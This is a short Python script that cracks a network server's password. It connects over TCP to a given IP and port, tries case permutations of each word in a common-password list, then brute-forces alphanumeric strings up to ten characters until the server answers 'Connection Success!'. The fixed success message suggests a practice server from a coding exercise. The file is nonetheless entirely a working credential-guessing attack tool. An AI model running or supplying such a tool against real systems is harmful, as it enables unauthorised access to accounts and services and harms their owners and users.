import sys
import socket
from string import ascii_letters, digits
from itertools import product
import itertools


def send_pass(client_socket, password):
    """
    Checks if a given password (input) is the correct password.
    :param client_socket: The connection to the server.
    :param password: The password to check.
    :return: the response of the server to the password checked.
    """
    client_socket.send(''.join(password).encode())
    response = client_socket.recv(1024)
    if response.decode() == "Connection Success!":
        return response.decode()
    else:
        return False


def brute_approach(client_socket):
    """
    Brute force approach to the server's password.
    :param client_socket: The connection to the server.
    :return: the response of the server to the password checked.
    """
    charset = ascii_letters + digits
    maxrange = 10
    for i in range(1, maxrange + 1):
        for password in product(charset, repeat=i):
            response = send_pass(client_socket, password)
            if response:
                print("The server's password:", ''.join(password))
                return response
            # else:print(response.decode())


def dic_approach(client_socket):
    """
    Check from the common password file all the passwords.
    :param client_socket: The connection to the server.
    :return: the response of the server to the password checked.
    """
    with open("passwords.txt") as pass_files:
        for line in pass_files:
            s = line.rstrip()
            # checks all the permuts of each common password in the file.
            permut = map(''.join, itertools.product(*zip(s.upper(), s.lower())))
            for per in permut:
                response = send_pass(client_socket, per)
                if response:
                    print("The server's password:", ''.join(per))
                    return response


def client(ip_add, port):
    """
    Try's to check the if the password is a common one, if it's not it resorts to brute-force.
    :param ip_add: The ip of the server.
    :param port: The port of the server.
    :return: The response from the server. If failed, returns fail.
    """
    with socket.socket() as client_socket:
        client_socket.connect((ip_add, int(port)))
        response = dic_approach(client_socket)
        if response:
            print(response)
        else:
            response = brute_approach(client_socket)
            if response:
                print(response)
            else:
                print('Failed')


def main():
    """
    Calls the client method.
    :return: None
    """
    client(sys.argv[1], sys.argv[2])


main()
